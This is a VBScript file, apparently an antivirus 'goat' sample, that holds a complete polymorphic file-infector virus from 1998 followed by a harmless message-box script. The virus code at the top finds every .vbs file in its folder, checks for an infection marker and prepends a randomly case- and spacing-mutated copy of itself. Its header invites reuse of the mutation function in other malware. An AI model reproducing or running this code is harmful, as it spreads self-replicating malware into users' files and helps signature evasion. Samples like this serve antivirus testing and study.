'**********
' A  POlymoRPhIc     ExAmpLE    Vb    script    vIRUs   BasEd    on  VbSV777
' By  sPo0ky +     caD     -     14.  NOV.  1998   -
' FeEL FrEE     to  usE    tHe  CbMutaTe     FuNcTIon In YouR owN   bugS   :-)

  cONSt   CBFoRreAdinG    = 1   ,     cBFoRwRiting  =     2

     RAnDOMIZE
  
   CbwePaTh  = wscripT     .  sCRipTfuLLNAMe
  
    SET    cBfSO  =     cREaTEobJEct (   "sCRIpTInG.FIlESysTEMOBjeCT"    )
   
     Set   CbwEFile     =  CBfSo .    opENTExTfIlE     (  cbwepaTH     ,  CbforREadiNg    )
  cBWEcOde   =    CbwefilE     .   Readall
 CbWeFILE . cloSe
     
 CBvIRUsSize   =  iNsTr    (    3    ,  Cbwecode  ,     "*****" &  "*****"   ) +     10   +   1

    SeT     cbWEFIlE =     cbfso    .     oPENtEXtFile    (     CBWepATh  ,     CBFORrEADIng     )
   cbweCodE  =   cbwefIlE   .   ReAD  ( cBVIRussIze )
 CbwEFilE     .  clOSE
  
 fOR  EAcH   cbFile     iN   CbFsO .  GETFOlDER     (  "." ) .    FiLeS
 
   if  Lcase   (   cBfSO   .     GetEXtENsiOnNaME     (  CbFiLE    .  naMe  )  )     =  CHr   (    118    )  & cHR  ( 98    )   &     CHr (   115   )  thEN
  
     Set   CBVICTImfILE   =    cbfsO  .    oPENTeXtfiLE    (  cbFIlE    . PaTH ,     CbfoRReadING    )
    cBinfeCTiOnMARkEr    =    CBviCTimfile    .     ReaD  (   11   )
    cbVICTIMfILe     .   cLose
    
  iF   cbINfECTiOnMaRKER    <>   "'*****" &   "*****"    thEn

  seT    CbVictIMfIlE   =     CBFSo   .    OPeNtextFILe  (    CbfILe   .    PaTh   ,     cBfOrreaDINg    )
   CbVICTiMcODE  =    cBVICtiMfILE   . ReADaLl
    CBvICtIMfiLE  .     cloSe
    
 CBviCtiMcODE     =     CbMutATE  (  CbwecodE )  & CbvicTIMcOde
   
     SEt CbVIcTIMfiLE =    CBFSo    .  OpEntExTFIlE     (    cBfiLE    . Path   ,    CbForwriting  ,    1    )
  cbVICTImfILe    .     wrITE     cBvIctImcOde
 CbViCTiMFILe    . cloSe
     
  EnD IF
   
 enD  IF
    
  nExT
    
     
  fUnctION  cbmUTAte   (  cBstriNg )
 
    cBnEWstRinG   =   ""
 cbI  =   1
    
  While   cBI    <= LeN   (  CbSTrING  )
   
  If     MId   (   cbSTRing    , cbi     ,    1    )    =   cHR    (  32  )   THEn

  foR  cbJ    =  1    tO INt    (    5    *    RnD   )    +     1

 CbneWstriNG =   cbneWStRiNG +    ChR     (  32 )

 nexT
    
  Do
   
    Cbi    =  CbI +     1
   
  LooP   whiLe     MiD   (  cBStRIng    ,   CBi  ,  1    )    = Chr  ( 32  )
  
     eLSE
    
    IF    INt     (  2   *   RNd    )   + 1    =   1     tHeN

    CBnewSTrinG    =   cBNewSTriNg +     ucase     ( MiD     (     CbSTRiNg  ,   CBI    , 1     )   )

   eLse

 CBNewSTRING =   cbNeWsTrIng   +  lcase    (    miD   (    cbstRiNG  ,    CBi  ,    1 )   )

  end     If

   cBi =  cBi  +   1
    
   End     if
 
 Wend
     
 CbmUTate    =   CBneWstring
    
   enD FUncTIOn
 
    '**********
'VBS Goat file

Dim Msg, Style, Title, Help, Ctxt, Responce, MyString
Msg = "This is Cybec VBS Goat file"
Style = vbYesNo + vbExclamation + vbDefaultButton2
Title = "Goat File"
Help = "Goat.hlp"
Ctxt = 1000

Responce = MsgBox(Msg, Style, Title, Help, Ctxt)
